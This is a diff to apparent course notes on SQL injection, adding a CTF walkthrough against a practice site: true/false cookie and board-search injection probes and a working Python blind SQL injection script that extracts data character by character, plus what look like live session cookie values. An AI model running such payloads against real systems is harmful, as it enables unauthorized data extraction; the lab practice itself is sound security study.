@@ -41,4 +41,53 @@
 #    1. Review
 #    2. SQL Injection attack types (https://www.acunetix.com/websitesecurity/sql-injection2/)
 #    3. CTF
+#      1) SQL Injection Point 1
+#        - On the mypage, check the SQL injection point.
+Cookie: user=muhush' and '1'='1; session=fa7175eb-376b-4af5-9e86-81393acf11a9.aU7QuoD1Nzvk5f-sAlyIfxpL2j0; PHPSESSID=8okntclrajuqjvnmgvuca9cdki
+<div class = "hori">
+  <i class="fas fa-birthday-cake fa-2x"></i>
+  <input name = "info" type = "text" placeholder="Nothing Here..."/>
+</div>
+
+#        - Check the false SQL injection condition.
+Cookie: user=muhush' and '1'='2; session=fa7175eb-376b-4af5-9e86-81393acf11a9.aU7QuoD1Nzvk5f-sAlyIfxpL2j0; PHPSESSID=8okntclrajuqjvnmgvuca9cdki
+<div class = "hori">
+  <i class="fas fa-birthday-cake fa-2x"></i>
+  <input name = "info" type = "text" placeholder=""/>
+</div>
+
+# Python Format
+import requests
+url = "http://ctf.segfaulthub.com:7777/sqli_6/mypage.php"
+success_message = 'Nothing Here'
+def send_request(sql_query):
+    cookie = {'user':sql_query,
+              'PHPSESSID':'8okntclrajuqjvnmgvuca9cdki'
+              }
+    response = requests.post(url, cookies=cookie)
+    return success_message in response.text
+
+sql_query = input("Put your SQL Injection: ")
+def Blind_SQLi(sql):
+    extract_info = ''
+    for i in range(1,101): #Maximum letter 100
+        for j in range(32,127): #ascii range
+            payload = f"muhush' and (ascii(substr(({sql}),{i},1))={j}) and '1'='1"
+            if send_request(payload):
+                extract_info += chr(j)
+                break
+        else:
+            break # No more letter
+    return extract_info
+extracted_data = Blind_SQLi(sql_query)
+print(f"Extracted Data: {extracted_data}")
+
+#      2) SQL Injection Point 2
+#        - On the board, check the SQL injection point
+option_val=username&board_result=x&board_search=%F0%9F%94%8D&date_from=&date_to=
+#        - True SQL Injection = Display the result
+option_val='1'='1' and username&board_result=x&board_search=%F0%9F%94%8D&date_from=&date_to=
+#        - False SQL Injection = Non-display the result
+option_val='1'='2' and username&board_result=x&board_search=%F0%9F%94%8D&date_from=&date_to=
+
 #    4. Web Development (Board - search function with secure code)
